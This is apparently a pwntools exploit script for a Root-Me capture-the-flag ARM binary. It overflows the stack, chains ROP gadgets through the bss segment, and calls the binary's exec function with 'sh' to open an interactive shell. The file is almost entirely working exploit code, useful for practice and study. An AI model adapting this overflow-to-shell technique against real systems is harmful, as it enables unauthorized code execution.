from pwn import *
import sys
context.binary = "./root_me_stack_spraying"
context.log_level = "debug"

if sys.argv[1] == "r":
    p = remote("remote_addr", remote_port)
elif sys.argv[1] == "l":
    p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./root_me_stack_spraying"])
else:
    p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf", "./root_me_stack_spraying"])

elf = ELF("./root_me_stack_spraying")
libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")

pop_r3_pc = 0x000103f8
pop_r11_pc = 0x00010634
padding = 0x44
main_scanf = 0x0001065C

#payload1 = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
payload1 = 'a'*(padding-4) + p32(elf.bss() + 0x300)
payload1 += p32(pop_r3_pc)
payload1 += p32(elf.bss() + 0x300-0x4*3)  # R3:write address
payload1 += p32(main_scanf)         

p.recvuntil(":\n")
p.sendline(payload1)

log.info("bss:"+hex(elf.bss()))
log.info("bss:"+hex(elf.sym['exec']))

# payload2 = "/bin;sh\x00" + p32(elf.sym['exec'])
# payload2 += p32(pop_r3_pc) + p32(elf.bss() + 0x300-0x4*3) + p32(pop_r11_pc)
# payload2 += p32(elf.bss() + 0x300-0x4) + p32(0x0001067C)
payload2 = "skye;sh\x00" + p32(elf.sym['exec'])
payload2 += p32(pop_r3_pc) + p32(elf.bss() + 0x300-0x4*3) + p32(pop_r11_pc)
payload2 += p32(elf.bss() + 0x300-0x4) + p32(0x0001067C)

sleep(0.2)
p.sendline(payload2)

p.interactive()